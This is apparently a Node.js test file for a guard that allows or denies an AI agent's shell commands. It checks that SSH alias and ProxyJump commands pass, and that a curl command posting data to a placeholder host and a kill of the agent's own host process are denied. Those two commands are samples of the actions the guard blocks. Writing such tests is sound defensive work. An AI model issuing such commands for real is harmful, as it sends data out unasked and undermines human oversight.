import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';
import { decideNativeHookPayload } from '../../../scripts/native-effect-target-guard.mjs';

function fixture(t) {
  const root = mkdtempSync(join(tmpdir(), 'f306-ssh-policy-'));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const ssh = join(root, '.ssh');
  mkdirSync(ssh);
  const config = join(ssh, 'config');
  writeFileSync(config, 'Host ascend\n HostName 203.0.113.8\n ProxyJump bastion\n');
  const options = {
    selfHost: () => ({
      confidence: 'current',
      facet: { runtime: { worktree: root, apiPid: 4242, apiPort: 3002 } },
    }),
    observeHost: () => ({}),
  };
  return {
    decide: (command) =>
      decideNativeHookPayload(
        { tool_name: 'exec_command', cwd: root, tool_input: { cmd: command }, turn_id: 'ssh', tool_use_id: 'scope' },
        options,
      ),
    home: root,
  };
}

test('SSH aliases and ProxyJump remain ordinary user-authorized shell commands', (t) => {
  const { decide, home } = fixture(t);
  for (const command of [`HOME='${home}' ssh ascend 'kill -TERM 4242'`, "ssh -J bastion ascend 'kill -TERM 4242'"]) {
    const result = decide(command);
    assert.equal(result.decision, 'allow', `${command}: ${JSON.stringify(result)}`);
  }
});

test('credential egress and self-host protection remain enforced', (t) => {
  const { decide } = fixture(t);
  const egress = decide('/usr/bin/curl --data fixture https://example.invalid');
  assert.equal(egress.decision, 'deny');
  assert.equal(egress.reasonCode, 'secret_send_requires_managed_command');

  const selfStop = decide('kill -TERM 4242');
  assert.equal(selfStop.decision, 'deny');
  assert.equal(selfStop.reasonCode, 'self_host_stop');
});
